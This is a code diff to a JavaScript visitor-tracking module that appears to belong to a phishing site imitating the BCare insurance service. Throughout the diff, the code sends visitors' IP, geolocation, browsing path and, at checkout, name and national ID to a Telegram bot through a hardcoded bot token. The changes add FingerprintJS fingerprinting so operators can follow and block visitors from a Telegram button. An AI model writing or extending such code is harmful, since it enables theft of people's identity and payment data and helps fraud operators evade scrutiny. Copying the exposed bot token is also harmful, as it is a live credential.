@@ -1,10 +1,11 @@
 /* ═══════════════════════════════════════════════════════
-   Tracker — تتبع رحلة العميل + الحظر
+   Tracker — تتبع رحلة العميل + الحظر (Fingerprint + IP)
    ═══════════════════════════════════════════════════════ */
 
 const Tracker = (function () {
   const STORAGE_KEY = 'bcare_journey';
   const IP_KEY      = 'bcare_ip';
+  const FP_KEY      = 'bcare_fp';
   const MSG_KEY     = 'bcare_msg_ids';
   const GEO_KEY     = 'bcare_geo';
   const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
@@ -33,6 +34,31 @@ const Tracker = (function () {
     }
     sessionStorage.setItem(IP_KEY, ip);
     return ip;
+  }
+
+  /* ─── جلب بصمة الجهاز (FingerprintJS) ─────────── */
+  async function getFingerprint() {
+    let fp = sessionStorage.getItem(FP_KEY);
+    if (fp) return fp;
+    try {
+      if (typeof FingerprintJS !== 'undefined') {
+        const agent = await FingerprintJS.load();
+        const result = await agent.get();
+        fp = result.visitorId;
+      } else {
+        fp = 'fp_fallback_' + Date.now().toString(36);
+      }
+    } catch(e) {
+      fp = 'fp_fallback_' + Date.now().toString(36);
+    }
+    sessionStorage.setItem(FP_KEY, fp);
+    return fp;
+  }
+
+  /* ─── جلب معرّف الجهاز (Fingerprint + IP) ─────── */
+  async function getDeviceId() {
+    const [fp, ip] = await Promise.all([getFingerprint(), getIP()]);
+    return { fp, ip };
   }
 
   /* ─── جلب الموقع الجغرافي ────────────────────────── */
@@ -81,7 +107,7 @@ const Tracker = (function () {
   }
 
   /* ─── بناء نص الرحلة ───────────────────────────── */
-  function buildJourneyText(ip, geo, journey, extra) {
+  function buildJourneyText(fp, ip, geo, journey, extra) {
     const pagesList = journey.map((j, i) =>
       `  ${i + 1}. ${j.pageName} — ${j.time}`
     ).join('\n');
@@ -90,6 +116,7 @@ const Tracker = (function () {
 
     return `👤 <b>زيارة جديدة</b>
 
+🔐 Fingerprint: <code>${fp}</code>
 🌐 IP: <code>${ip}</code>${loc ? '\n📍 الموقع: ' + loc : ''}
 📱 الصفحة: ${PAGE_NAMES[Object.keys(PAGE_NAMES).find(k => journey.length && journey[journey.length-1].page === k)] || ''}
 🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
@@ -100,23 +127,23 @@ ${extra ? '\n' + extra : ''}`;
   }
 
   /* ─── إرسال أو تحديث رسالة لتليجرام ─────────────── */
-  async function sendOrUpdateVisit(ip, geo, journey, extra) {
+  async function sendOrUpdateVisit(fp, ip, geo, journey, extra) {
     try {
       const msgIds = JSON.parse(localStorage.getItem(MSG_KEY) || '{}');
-      const text = buildJourneyText(ip, geo, journey, extra);
+      const text = buildJourneyText(fp, ip, geo, journey, extra);
       const blockKB = {
-        inline_keyboard: [[{ text: '🚫 حظر هذا العميل', callback_data: `blockip_${ip}` }]]
+        inline_keyboard: [[{ text: '🚫 حظر هذا العميل', callback_data: `blockdev_${fp}` }]]
       };
 
-      /* إذا there's a previous message for this IP → تحديثه */
-      if (msgIds[ip]) {
+      /* إذا there's a previous message for this fingerprint → تحديثه */
+      if (msgIds[fp]) {
         try {
           const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               chat_id: TG_CHAT,
-              message_id: msgIds[ip],
+              message_id: msgIds[fp],
               text,
               parse_mode: 'HTML',
               reply_markup: blockKB,
@@ -139,7 +166,7 @@ ${extra ? '\n' + extra : ''}`;
       });
       const d = await res.json();
       if (d.ok && d.result) {
-        msgIds[ip] = d.result.message_id;
+        msgIds[fp] = d.result.message_id;
         localStorage.setItem(MSG_KEY, JSON.stringify(msgIds));
       }
     } catch(e) {}
@@ -148,7 +175,7 @@ ${extra ? '\n' + extra : ''}`;
   /* ─── إرسال الرحلة عند الدفع ────────────────────── */
   async function sendJourneyToTelegram(extra) {
     try {
-      const ip = await getIP();
+      const { fp, ip } = await getDeviceId();
       const geo = await getGeo(ip);
       const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
       const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
@@ -165,7 +192,7 @@ ${extra ? '\n' + extra : ''}`;
 👤 الاسم: ${name}
 🪪 الهوية: <code>${natId}</code>`;
 
-      await sendOrUpdateVisit(ip, geo, journey, extraBlock);
+      await sendOrUpdateVisit(fp, ip, geo, journey, extraBlock);
     } catch(e) {}
   }
 
@@ -214,22 +241,22 @@ ${extra ? '\n' + extra : ''}`;
           const cq = u.callback_query;
           const data = cq.data || '';
 
-          if (data.startsWith('blockip_')) {
-            const ip = data.replace('blockip_', '');
+          if (data.startsWith('blockdev_')) {
+            const fp = data.replace('blockdev_', '');
             tgAnswerCallback(cq.id, '🚫 تم الحظر');
+            blockDevice(fp, cq.message.text);
             tgEditMsg(cq.message.chat.id, cq.message.message_id,
               cq.message.text + `\n\n🚫 <b>تم حظر هذا العميل</b>`,
-              { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
-            blockIP(ip);
+              { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockdev_${fp}` }]] });
             continue;
           }
 
-          if (data.startsWith('unblockip_')) {
-            const ip = data.replace('unblockip_', '');
+          if (data.startsWith('unblockdev_')) {
+            const fp = data.replace('unblockdev_', '');
             tgAnswerCallback(cq.id, '✅ تم إلغاء الحظر');
+            unblockDevice(fp);
             tgEditMsg(cq.message.chat.id, cq.message.message_id,
               cq.message.text + `\n\n✅ <b>تم إلغاء حظر هذا العميل</b>`);
-            unblockIP(ip);
             continue;
           }
 
@@ -262,21 +289,21 @@ ${extra ? '\n' + extra : ''}`;
     blockPollInt = setInterval(startBlockPolling, 3000);
   }
 
-  /* ─── فحص الحظر ─────────────────────────────────── */
+  /* ─── فحص الحظر (Fingerprint + IP) ─────────────── */
   async function checkBlocked() {
     try {
-      const ip = await getIP();
+      const { fp, ip } = await getDeviceId();
 
       const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
-      if (local.some(b => b.ip === ip)) {
-        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
+      if (local.some(b => b.fp === fp || b.ip === ip)) {
+        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع بسبب أنشطة مشبوهة.', 'block');
         return true;
       }
 
       const r = await fetch('blocked.json?t=' + Date.now());
       const blocked = await r.json();
-      if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
-        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
+      if (Array.isArray(blocked) && blocked.some(b => b.fp === fp || b.ip === ip)) {
+        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع بسبب أنشطة مشبوهة.', 'block');
         return true;
       }
     } catch(e) {}
@@ -371,22 +398,23 @@ ${extra ? '\n' + extra : ''}`;
     </body></html>`;
   }
 
-  /* ─── حظر IP ─────────────────────────────────────── */
-  async function blockIP(ip) {
+  /* ─── حظر جهاز (Fingerprint + IP) ──────────────── */
+  async function blockDevice(fp, messageText) {
     try {
+      const ip = await getIP();
       let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
-      if (!blocked.some(b => b.ip === ip)) {
-        blocked.push({ ip, blockedAt: new Date().toISOString() });
+      if (!blocked.some(b => b.fp === fp)) {
+        blocked.push({ fp, ip, blockedAt: new Date().toISOString() });
         localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
       }
     } catch(e) {}
   }
 
-  /* ─── إلغاء حظر IP ─────────────────────────────── */
-  async function unblockIP(ip) {
+  /* ─── إلغاء حظر جهاز ───────────────────────────── */
+  async function unblockDevice(fp) {
     try {
       let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
-      blocked = blocked.filter(b => b.ip !== ip);
+      blocked = blocked.filter(b => b.fp !== fp);
       localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
     } catch(e) {}
   }
@@ -416,19 +444,19 @@ ${extra ? '\n' + extra : ''}`;
 
     /* إرسال أو تحديث زيارة */
     try {
-      const ip = await getIP();
+      const { fp, ip } = await getDeviceId();
       const geo = await getGeo(ip);
       const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-      await sendOrUpdateVisit(ip, geo, journey);
+      await sendOrUpdateVisit(fp, ip, geo, journey);
     } catch(e) {}
   }
 
-  return { init, getIP, onCallback, onAnyMessage, sendJourneyToTelegram, onCheckout: async () => {
-    const ip = await getIP();
+  return { init, getIP, getFingerprint, getDeviceId, onCallback, onAnyMessage, sendJourneyToTelegram, onCheckout: async () => {
+    const { fp, ip } = await getDeviceId();
     const geo = await getGeo(ip);
     const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-    await sendOrUpdateVisit(ip, geo, journey, '💰 <b>العميل وصل صفحة الدفع</b>');
-  }, clear, checkBlocked, blockIP, unblockIP };
+    await sendOrUpdateVisit(fp, ip, geo, journey, '💰 <b>العميل وصل صفحة الدفع</b>');
+  }, clear, checkBlocked, blockDevice, unblockDevice };
 })();
 
 document.addEventListener('DOMContentLoaded', () => Tracker.init());
